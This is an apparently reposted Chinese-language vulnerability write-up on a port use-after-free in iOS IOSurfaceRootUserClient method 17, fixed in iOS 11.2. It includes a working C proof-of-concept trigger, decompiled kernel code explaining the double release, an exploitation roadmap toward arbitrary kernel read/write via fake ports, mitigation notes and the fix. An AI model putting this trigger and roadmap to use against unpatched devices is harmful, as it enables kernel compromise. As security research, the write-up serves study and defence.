> 原文链接: https://www.anquanke.com//post/id/89129 


# IOSurfaceRootUserClient Port UAF漏洞分析


                                阅读量   
                                **108585**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01e0eb27cddc17e549.png)](https://p2.ssl.qhimg.com/t01e0eb27cddc17e549.png)



## 漏洞描述

苹果前天发布了iOS 11.2版本（安全更新细节尚未公布），经测试发现此次更新修复了一个沙盒内可以直接利用的内核漏洞。我们团队在去年发现该漏洞，并一直在内部的研究环境中使用该漏洞对手机进行越狱。漏洞存在于IOSurfaceRootUserClient类的调用方法中，可以导致port的UAF。首先我们给出该漏洞触发的POC：

```
// open user client
CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
io_connect_t connect = 0;
IOServiceOpen(service, mach_task_self(), 0, &amp;connect);

// add notification port with same refcon multiple times
mach_port_t port = 0;
mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;port);
uint64_t references;
uint64_t input[3] = `{`0`}`;
input[1] = 1234;  // keep refcon the same value
for (int i=0; i&lt;3; i++)
`{`
    IOConnectCallAsyncStructMethod(connect, 17, port, &amp;references, 1, input, sizeof(input), NULL, NULL);
`}`
IOServiceClose(connect);
```

通过POC代码可以看到漏洞存在于17号调用函数，定位后对其进行逆向分析。该函数会将传入的port、callback、refcon等数据保存起来，以供需要向用户态发送消息时使用。传入的数据大小是0x18，前两个64位数据分别是callback地址和refcon的值。值得注意的是在保存数据前会首先检查相同的refcon是否已经存在，如果存在则认为已经添加过了，会调用releaseAsyncReference64函数释放reference，从而调用iokit_release_port_send释放我们传入的port，并且返回0xE00002C9号错误。

```
if ( !a3-&gt;asyncReference )
    return 0xE00002C2LL;
  input = (__int64)a3-&gt;structureInput;
  reference = (__int64)a3-&gt;asyncReference;
  v6 = *(_QWORD *)(a1 + 224);
  v7 = 0xE00002BDLL;
  IORecursiveLockLock_53(*(_QWORD *)(v6 + 264));
  v8 = *(_QWORD *)(v6 + 344);
  if ( v8 )
  `{`
    // 检查相同refcon的数据是否已经存在
    while ( *(_QWORD *)(v8 + 32) != *(_QWORD *)(input + 8) || *(_QWORD *)(v8 + 88) != a1 )
    `{`
      v8 = *(_QWORD *)v8;
      if ( !v8 )
        goto LABEL_8;
    `}`
    IOUserClient::releaseAsyncReference64(reference);
    v7 = 0xE00002C9LL;
  `}`
  else
  `{`
    // 分配内存并通过setAsyncReference64初始化，保存port/callback/refcon
LABEL_8:
    v9 = IOMalloc_53(96LL);
    v10 = v9;
    if ( v9 )
    `{`
      v11 = v6 + 344;
      memset_53((void *)v9, 0, 0x60uLL);
      IOUserClient::setAsyncReference64(v10 + 16, *(_QWORD *)reference, *(_QWORD *)input, *(_QWORD *)(input + 8));
      *(_QWORD *)(v10 + 88) = a1;
      *(_QWORD *)(v10 + 80) = *(_QWORD *)(input + 16);
      v12 = *(_QWORD *)(v6 + 344);
      *(_QWORD *)v10 = *(_QWORD *)(v6 + 344);
      if ( v12 )
        *(_QWORD *)(v12 + 8) = v10;
      else
        *(_QWORD *)(v6 + 352) = v10;
      v7 = 0LL;
      *(_QWORD *)v11 = v10;
      *(_QWORD *)(v10 + 8) = v11;
    `}`
  `}`
  IORecursiveLockUnlock_53(*(_QWORD *)(v6 + 264));
  return v7;
`}`
```

如果只是单纯分析该函数的行为，并不存在明显的问题，因此需要结合整个代码路径来看。我们知道IOKit是MIG的子系统，因此用户态最终封装一个message后通过mach_msg发送给内核处理并接受返回消息。而通过mach_msg传输一个port，需要发送complex的消息，内核则在copyin消息的时候会把port name翻译成对应的port地址，并增加一个引用。随后把消息交给ipc_kobject_server处理，观察ipc_kobject_server函数的分发处理：

```
/*
   * Find the routine to call, and call it
   * to perform the kernel function
   */
  ipc_kmsg_trace_send(request, option);
  `{`
    ...

    // 调用真正的处理函数，返回结果设置在reply消息内
    (*ptr-&gt;routine)(request-&gt;ikm_header, reply-&gt;ikm_header);

    ...
  `}`

  // 如果返回的是简单消息，kr被设置为处理函数的返回值
  if (!(reply-&gt;ikm_header-&gt;msgh_bits &amp; MACH_MSGH_BITS_COMPLEX) &amp;&amp;
     ((mig_reply_error_t *) reply-&gt;ikm_header)-&gt;RetCode != KERN_SUCCESS)
    kr = ((mig_reply_error_t *) reply-&gt;ikm_header)-&gt;RetCode;
  else
    kr = KERN_SUCCESS;

  if ((kr == KERN_SUCCESS) || (kr == MIG_NO_REPLY)) `{`
    /*
     *  The server function is responsible for the contents
     *  of the message.  The reply port right is moved
     *  to the reply message, and we have deallocated
     *  the destination port right, so we just need
     *  to free the kmsg.
     */
    // 如果返回成功则简单释放传入消息的内存
    ipc_kmsg_free(request);

  `}` else `{`
    /*
     *  The message contents of the request are intact.
     *  Destroy everthing except the reply port right,
     *  which is needed in the reply message.
     */
    // 如果返回错误，则释放传入消息相关的数据（包含port）
    request-&gt;ikm_header-&gt;msgh_local_port = MACH_PORT_NULL;
    ipc_kmsg_destroy(request);
  `}`
```

可以看到如果UserClient的处理函数返回错误，那么上层会调用ipc_kmsg_destroy-&gt;ipc_kmsg_clean-&gt;ipc_kmsg_clean_body最终释放传入的port和ool内存。此时我们再看IOSurfaceRootUserClient的17号调用，当它返回错误的时候，认为应该由自己去释放这个port而没有考虑到上层的清理代码，导致这个port会被额外释放一次。



## 利用思路

这是一个典型的port UAF类型的漏洞。我们可以任意创建一个port，通过17号调用释放该port，同时保留用户态的port name指向已经被释放的port地址。典型的利用思路是通过cross zone attack来填充一个虚假的port：
- 用ool ports来填充，我们可以读取一个port的的真实地址，导致堆地址泄露
- 用clock port来填充，可以猜测内核的基地址
- 用task port来填充，可以实现任意内核读取
- 用真实的kernel task port来填充，可以直接获取内核port，实现任意内核读写


## Mitigations
- iOS 10.3以后增加了对kernel task port的保护，不过该保护仅仅比较port指向的task是否等于kernel_task，并未对立面的内容进行校验
- iOS 11以后移除了mach_zone_force_gc的接口来阻止cross zone attack，需要有别的途径能够触发gc


## Fix

iOS 11.2中检测到要注册的refcon已经存在后也不会调用releaseAsyncReference64去释放port了。

#### 最后想说*****这次又是被谁撞了 TT
